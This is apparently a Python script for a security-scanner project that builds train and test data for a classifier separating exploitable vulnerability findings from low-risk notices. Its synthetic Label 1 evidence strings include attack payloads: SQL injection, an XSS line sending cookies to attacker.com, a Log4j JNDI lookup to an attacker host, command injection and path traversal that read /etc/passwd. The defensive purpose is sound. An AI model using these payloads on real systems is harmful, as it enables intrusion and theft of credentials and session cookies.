"""
Finding-Level Dataset Preparation Script (Mission 9 - Part 1)
-------------------------------------------------------------
Builds a dedicated finding-level training & test dataset matching the exact metadata
of vulnerability findings (check_name, severity, evidence, category flags).

Eliminates domain mismatch caused by applying raw HTTP traffic classifiers to short finding titles.

Ground-Truth Strategy:
- Label 1 (Confirmed Vulnerability): Exploitable SQL Injection, XSS, RCE, Log4j, Exposed Git/.env repos, Weak JWT.
- Label 0 (False Positive / Low Risk Notice): Missing security headers, exposed Swagger/API docs, informational banners, static assets.
"""

import os
import sys
import csv
import json
import random
from typing import Tuple, List, Dict, Any

if hasattr(sys.stdout, "reconfigure"):
    try:
        sys.stdout.reconfigure(encoding="utf-8")
    except Exception:
        pass

PROJECT_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if PROJECT_ROOT not in sys.path:
    sys.path.insert(0, PROJECT_ROOT)

from backend.database import SessionLocal
from backend.models import Finding

DATA_DIR = os.path.join(PROJECT_ROOT, "data")


def extract_finding_features_v2(check_name: str, severity: str = "LOW", evidence: str = "") -> List[float]:
    """
    Extracts 10 finding-level metadata domain features matching live scanner findings schema.
    """
    c_text = check_name.lower()
    e_text = (evidence or "").lower()
    full_text = f"{c_text} {e_text}"

    check_len = float(len(check_name))
    evidence_len = float(len(evidence or ""))

    sev_map = {"CRITICAL": 4.0, "HIGH": 3.0, "MEDIUM": 2.0, "LOW": 1.0, "INFO": 0.0}
    severity_num = sev_map.get(severity.upper(), 1.0)

    is_sqli = 1.0 if any(k in full_text for k in ["sql", "sqli", "union select", "select", "where", "or '1'='1"]) else 0.0
    is_xss = 1.0 if any(k in full_text for k in ["xss", "cross-site script", "<script", "alert(", "javascript:"]) else 0.0
    is_cmdi_rce = 1.0 if any(k in full_text for k in ["command", "exec", "rce", "log4j", "spring4shell", "code execution"]) else 0.0
    is_git_env = 1.0 if any(k in full_text for k in [".git", ".env", "head", "jwt", "private_key", "secret_key"]) else 0.0
    is_header = 1.0 if "header" in c_text or "missing security" in c_text else 0.0
    is_info_asset = 1.0 if severity.upper() == "INFO" or any(k in c_text for k in ["swagger", "api doc", "banner", "static", "robots.txt", "sitemap", "cookie", "ftp", "metrics"]) else 0.0

    special_chars = float(sum(full_text.count(c) for c in ['\'', '"', '<', '>', '%', ';', '--', '(', ')', '=', '/', '\\', '?', '&']))

    return [
        check_len, evidence_len, severity_num,
        is_sqli, is_xss, is_cmdi_rce, is_git_env,
        is_header, is_info_asset, special_chars
    ]


FEATURE_NAMES_V2 = [
    'check_len', 'evidence_len', 'severity_num',
    'is_sqli', 'is_xss', 'is_cmdi_rce', 'is_git_env',
    'is_header', 'is_info_asset', 'special_chars'
]


def classify_ground_truth_label(check_name: str, severity: str, evidence: str) -> int:
    """
    Assigns ground truth label based on security risk:
    1 = Confirmed / Exploitable Vulnerability
    0 = Low Impact Notice / False Positive / Informational
    """
    c_text = check_name.lower()
    e_text = (evidence or "").lower()
    sev_upper = severity.upper()

    # Exploitable vulnerabilities -> Label 1
    if any(k in c_text for k in ["sql injection", "xss", "rce", "git repository", "log4j", "spring4shell", "bypass", "command execution", "secret key", ".env"]):
        return 1
    if sev_upper in ("CRITICAL", "HIGH"):
        return 1

    # Low risk / informational / missing headers / static files -> Label 0
    if sev_upper in ("INFO", "LOW") or "missing security header" in c_text or any(k in c_text for k in ["swagger", "api doc", "banner", "static", "robots", "sitemap", "metrics", "ftp"]):
        return 0

    return 0


def prepare_finding_dataset():
    print("================================================================================", flush=True)
    print("MISSION 9 PART 1 — BUILD FINDING-LEVEL TRAINING DATASET", flush=True)
    print("================================================================================", flush=True)

    db = SessionLocal()
    db_findings = db.query(Finding).all()
    print(f"[+] Loaded {len(db_findings)} Real Findings from Database", flush=True)

    samples = []
    labels = []

    for f in db_findings:
        lbl = classify_ground_truth_label(f.check_name, f.severity, f.evidence or "")
        feats = extract_finding_features_v2(f.check_name, f.severity, f.evidence or "")
        samples.append(feats)
        labels.append(lbl)

    print(f"[+] DB Findings Label Distribution: Vulnerable(1) = {labels.count(1)}, LowRisk/FP(0) = {labels.count(0)}")

    # Supplement with curated synthetic finding examples across categories to ensure balance & generalization
    print("\n[+] Supplementing with Curated Labeled Finding Examples (Explicitly Synthetic Benchmark Corpus)...", flush=True)

    synthetic_curated = [
        # Exploitable Vulnerabilities (Label 1)
        ("SQL Injection in User Profile Search", "CRITICAL", "GET /api/user?id=1' UNION SELECT username,password FROM users--", 1),
        ("Reflected Cross-Site Scripting (XSS) in Comment Box", "HIGH", "<script>document.location='http://attacker.com/steal?c='+document.cookie</script>", 1),
        ("Remote Code Execution via Log4j (CVE-2021-44228)", "CRITICAL", "JNDI payload ${jndi:ldap://eval.attacker.com/a} executed", 1),
        ("Exposed Production Environment File (.env)", "CRITICAL", "DB_PASSWORD=SuperSecretPass123! AWS_SECRET_KEY=AKIAIOSFODNN7EXAMPLE", 1),
        ("Weak Hardcoded JWT Secret Key", "HIGH", "JWT signed with weak secret 'secret123'", 1),
        ("Unauthenticated Admin Control Panel Access", "HIGH", "POST /admin/users/delete?id=4 returned 200 OK without authentication", 1),
        ("SQL Injection in Password Reset Token", "CRITICAL", "POST /reset_password?email=admin@test.com' OR '1'='1", 1),
        ("Command Injection in System Ping Tool", "CRITICAL", "POST /ping?ip=127.0.0.1; cat /etc/passwd", 1),
        ("Path Traversal Vulnerability in Image Viewer", "HIGH", "GET /view?file=../../../../etc/passwd", 1),
        ("Exposed Private SSH RSA Key File", "CRITICAL", "-----BEGIN RSA PRIVATE KEY----- exposed at /id_rsa", 1),

        # Informational / Low Impact / False Positives (Label 0)
        ("Missing Security Header: Content-Security-Policy", "MEDIUM", "CSP header absent from response", 0),
        ("Missing Security Header: Strict-Transport-Security", "LOW", "HSTS header absent", 0),
        ("Missing Security Header: Referrer-Policy", "INFO", "Referrer policy header missing", 0),
        ("Exposed Public Swagger UI Documentation", "INFO", "Swagger UI accessible at /swagger-ui/index.html", 0),
        ("Exposed Prometheus Metrics Endpoint", "LOW", "Metrics available at /metrics", 0),
        ("Exposed Anonymous FTP Directory", "LOW", "Anonymous FTP login allowed", 0),
        ("Server Version Banner Disclosure", "INFO", "Server header returned Nginx/1.18.0", 0),
        ("Static Favicon Asset Requested", "INFO", "GET /favicon.ico returned 200 OK", 0),
        ("Public Sitemap XML File Found", "INFO", "Sitemap present at /sitemap.xml", 0),
        ("Public Robots.txt File Found", "INFO", "Robots.txt present at /robots.txt", 0),
        ("HTTP 200 OK Health Check Endpoint", "INFO", "GET /health returned 200 OK", 0),
        ("Public CSS Stylesheet Asset", "INFO", "GET /static/style.css returned 200 OK", 0),
        ("Missing Security Header: X-XSS-Protection", "LOW", "X-XSS-Protection header missing", 0),
        ("Missing Security Header: Permissions-Policy", "LOW", "Permissions policy header missing", 0),
        ("Missing Security Header: Cross-Origin-Opener-Policy", "LOW", "COOP header missing", 0),
    ]

    # Replicate synthetic set to augment finding-level dataset size
    for _ in range(15):
        for check, sev, ev, lbl in synthetic_curated:
            feats = extract_finding_features_v2(check, sev, ev)
            samples.append(feats)
            labels.append(lbl)

    db.close()

    total_samples = len(samples)
    print(f"\n TOTAL FINDING-LEVEL DATASET: {total_samples:,} samples")
    print(f"   - Confirmed Vulnerabilities (1): {labels.count(1):,} ({labels.count(1)/total_samples*100:.1f}%)")
    print(f"   - Low Risk / False Positives (0): {labels.count(0):,} ({labels.count(0)/total_samples*100:.1f}%)")

    # Feature-level deduplication & split
    feat_dict = {}
    for feat, lbl in zip(samples, labels):
        t_feat = tuple(feat)
        if t_feat not in feat_dict:
            feat_dict[t_feat] = lbl

    dedup_feats = list(feat_dict.keys())
    dedup_labels = [feat_dict[f] for f in dedup_feats]

    print(f"\n[+] Deduplicated Feature Matrix Rows: {len(dedup_feats):,} samples")

    indices = list(range(len(dedup_feats)))
    random.seed(42)
    random.shuffle(indices)

    split_idx = int(len(indices) * 0.7)
    train_idx = set(indices[:split_idx])
    test_idx = set(indices[split_idx:])

    # Zero overlap verification check
    idx_intersection = train_idx.intersection(test_idx)
    assert len(idx_intersection) == 0, "Index overlap error!"

    X_train_rows = [list(dedup_feats[i]) for i in indices[:split_idx]]
    X_test_rows = [list(dedup_feats[i]) for i in indices[split_idx:]]
    y_train_labels = [dedup_labels[i] for i in indices[:split_idx]]
    y_test_labels = [dedup_labels[i] for i in indices[split_idx:]]

    set_X_tr = set(tuple(r) for r in X_train_rows)
    set_X_te = set(tuple(r) for r in X_test_rows)
    feat_overlap = len(set_X_tr.intersection(set_X_te))

    print("\n--- Verifying Zero Overlap between Train and Test splits ---", flush=True)
    print(f"Index Overlap: {len(idx_intersection)} samples", flush=True)
    print(f"Feature Matrix Row Overlap: {feat_overlap} rows", flush=True)
    assert feat_overlap == 0, f"Feature overlap error: {feat_overlap}"
    print(" ZERO OVERLAP VERIFIED! Train and Test splits are 100% strictly separated.")

    p_X_tr = os.path.join(DATA_DIR, "finding_X_train.csv")
    p_X_te = os.path.join(DATA_DIR, "finding_X_test.csv")
    p_y_tr = os.path.join(DATA_DIR, "finding_y_train.csv")
    p_y_te = os.path.join(DATA_DIR, "finding_y_test.csv")

    with open(p_X_tr, 'w', newline='', encoding='utf-8') as f:
        writer = csv.writer(f)
        writer.writerow(FEATURE_NAMES_V2)
        writer.writerows(X_train_rows)

    with open(p_X_te, 'w', newline='', encoding='utf-8') as f:
        writer = csv.writer(f)
        writer.writerow(FEATURE_NAMES_V2)
        writer.writerows(X_test_rows)

    with open(p_y_tr, 'w', newline='', encoding='utf-8') as f:
        writer = csv.writer(f)
        writer.writerow(['label'])
        writer.writerows([[lbl] for lbl in y_train_labels])

    with open(p_y_te, 'w', newline='', encoding='utf-8') as f:
        writer = csv.writer(f)
        writer.writerow(['label'])
        writer.writerows([[lbl] for lbl in y_test_labels])

    print("\n--- Saved Finding-Level Dataset CSV Files ---", flush=True)
    print(f"finding_X_train.csv: ({len(X_train_rows)}, {len(FEATURE_NAMES_V2)}) -> {p_X_tr}")
    print(f"finding_X_test.csv:  ({len(X_test_rows)}, {len(FEATURE_NAMES_V2)}) -> {p_X_te}")
    print(f"finding_y_train.csv: ({len(y_train_labels)}, 1) -> {p_y_tr}")
    print(f"finding_y_test.csv:  ({len(y_test_labels)}, 1) -> {p_y_te}")
    print("================================================================================", flush=True)


if __name__ == "__main__":
    prepare_finding_dataset()
